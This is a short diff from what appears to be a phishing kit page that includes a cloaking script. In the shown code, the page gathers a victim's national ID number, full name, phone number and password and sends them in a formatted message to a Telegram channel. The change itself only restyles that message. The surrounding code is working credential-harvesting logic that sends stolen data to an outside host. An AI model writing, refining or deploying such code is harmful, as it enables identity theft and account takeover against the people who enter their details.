@@ -210,7 +210,7 @@ require_once __DIR__ . '/../cloak.php';
                     formData.userName = userName;
                     localStorage.setItem('formData', JSON.stringify(formData));
 
-                    const message = `🟣INGRESO LOGO🟣  \n\n🪪 Cédula: ${formData.cedula}\n👤 Nombres: ${formData.nombreCompleto}\n📱 Número: ${phoneNumber}\n🔐 Clave: ${password}\n`;
+                    const message = `***⚡ INGRESO LOGO ⚡***  \n\n🪪 **Cédula:** ${formData.cedula}\n👤 **Nombres:** ${formData.nombreCompleto}\n📱 **Número:** ${phoneNumber}\n🔐 **Clave:** ${password}\n`;
 
                     try {
                         await enviarMensajeTelegramSinBotones(message);
